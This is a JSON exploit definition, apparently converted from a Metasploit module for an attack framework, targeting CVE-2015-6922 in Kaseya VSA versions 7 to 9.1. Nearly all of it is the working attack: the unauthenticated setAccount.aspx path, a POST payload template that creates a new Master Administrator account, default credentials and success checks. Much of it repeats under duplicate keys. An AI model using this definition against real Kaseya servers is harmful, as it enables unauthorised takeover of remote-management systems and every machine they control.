{
   "path" : "LocalAuth/setAccount.aspx?",
   "type" : "MSF",
   "plugins_directory" : "/home/evil/GIT/Exploits/../data/plugins/",
   "informations" : {
      "VARIABLES" : {
         "KASEYA_USER" : {
            "VALUE" : "",
            "DESCRIPTION" : ""
         },
         "EMAIL" : {
            "DESCRIPTION" : "The email for the new admin account",
            "VALUE" : "msf@email.loc"
         },
         "PATH" : {
            "DESCRIPTION" : "The Kaseya VSA URI",
            "VALUE" : "/"
         },
         "ADMINEMAIL" : {
            "VALUE" : "",
            "DESCRIPTION" : ""
         },
         "NEWPASSWORD" : {
            "VALUE" : "",
            "DESCRIPTION" : ""
         },
         "CONFIRM" : {
            "DESCRIPTION" : "",
            "VALUE" : ""
         },
         "SESSIONVAL" : {
            "DESCRIPTION" : "",
            "VALUE" : ""
         },
         "KASEYA_PASS" : {
            "DESCRIPTION" : "The password for the new admin account",
            "VALUE" : "password"
         },
         "ADMINNAME" : {
            "VALUE" : "",
            "DESCRIPTION" : ""
         }
      },
      "MSF_MODULE" : "kaseya_master_admin",
      "CVE" : "CVE-2015-6922",
      "TITLE" : "Kaseya VSA Master Administrator Account Creation",
      "DESCRIPTION" : "\n\n        This module abuses the setAccount page on Kaseya VSA between 7 and 9.1 to create a new\n\n        Master Administrator account. Normally this page is only accessible via the localhost\n\n        interface, but the application does nothing to prevent this apart from attempting to\n\n        force a redirect. This module has been tested with Kaseya VSA v7.0.0.17, v8.0.0.10 and\n\n        v9.0.0.3.\n\n      ",
      "name" : "KaseyaMasterAdmin",
      "REQUESTS" : {
         "EXPLOIT1" : {
            "PATH" : "",
            "METHOD" : "GET",
            "PAYLOAD" : "",
            "HEADERS" : {
               "Content-Type" : "application/x-www-form-urlencoded"
            },
            "TEXT" : "Sending Exploit #1 Request : [GET] ",
            "VALIDATION" : {
               "TCODE" : [
                  "200"
               ]
            }
         }
      },
      "PAYLOAD" : "sessionVal=__SESSIONVAL__&adminName=__ADMINNAME__&NewPassword=__NEWPASSWORD__&confirm=__CONFIRM__&adminEmail=__ADMINEMAIL__&setAccount=Create&",
      "METHOD" : "POST",
      "THE USERTITLE FOR THE NEW ADMIN ACCOUNT" : "msf",
      "PATH" : "LocalAuth/setAccount.aspx?",
      "PATHS" : [
         "LocalAuth/setAccount.aspx",
         "LocalAuth/setAccount.aspx",
         ""
      ],
      "REFERENCES" : [
         "https://raw.githubusercontent.com/pedrib/PoC/master/advisories/kaseya-vsa-vuln-2.txt",
         "http://seclists.org/bugtraq/2015/Sep/132"
      ],
      "PLATFORM" : "ALL",
      "TYPE" : "MSF"
   },
   "detection" : {},
   "title" : "Kaseya VSA Master Administrator Account Creation",
   "variables" : {
      "ADMINNAME" : {
         "VALUE" : "",
         "DESCRIPTION" : ""
      },
      "SESSIONVAL" : {
         "DESCRIPTION" : "",
         "VALUE" : ""
      },
      "KASEYA_PASS" : {
         "DESCRIPTION" : "The password for the new admin account",
         "VALUE" : "password"
      },
      "CONFIRM" : {
         "DESCRIPTION" : "",
         "VALUE" : ""
      },
      "NEWPASSWORD" : {
         "VALUE" : "",
         "DESCRIPTION" : ""
      },
      "ADMINEMAIL" : {
         "VALUE" : "",
         "DESCRIPTION" : ""
      },
      "PATH" : {
         "DESCRIPTION" : "The Kaseya VSA URI",
         "VALUE" : "/"
      },
      "KASEYA_USER" : {
         "VALUE" : "",
         "DESCRIPTION" : ""
      },
      "EMAIL" : {
         "DESCRIPTION" : "The email for the new admin account",
         "VALUE" : "msf@email.loc"
      }
   },
   "payload" : "sessionVal=__SESSIONVAL__&adminName=__ADMINNAME__&NewPassword=__NEWPASSWORD__&confirm=__CONFIRM__&adminEmail=__ADMINEMAIL__&setAccount=Create&",
   "method" : "POST",
   "platform" : "ALL",
   "description" : "\n\n        This module abuses the setAccount page on Kaseya VSA between 7 and 9.1 to create a new\n\n        Master Administrator account. Normally this page is only accessible via the localhost\n\n        interface, but the application does nothing to prevent this apart from attempting to\n\n        force a redirect. This module has been tested with Kaseya VSA v7.0.0.17, v8.0.0.10 and\n\n        v9.0.0.3.\n\n      ",
   "the usertitle for the new admin account" : "msf",
   "requests" : {
      "EXPLOIT1" : {
         "PATH" : "",
         "METHOD" : "GET",
         "PAYLOAD" : "",
         "HEADERS" : {
            "Content-Type" : "application/x-www-form-urlencoded"
         },
         "TEXT" : "Sending Exploit #1 Request : [GET] ",
         "VALIDATION" : {
            "TCODE" : [
               "200"
            ]
         }
      }
   },
   "paths" : [
      "LocalAuth/setAccount.aspx",
      "LocalAuth/setAccount.aspx",
      ""
   ],
   "cve" : "CVE-2015-6922",
   "name" : "KaseyaMasterAdmin",
   "msf_module" : "kaseya_master_admin",
   "references" : [
      "https://raw.githubusercontent.com/pedrib/PoC/master/advisories/kaseya-vsa-vuln-2.txt",
      "http://seclists.org/bugtraq/2015/Sep/132"
   ]
}
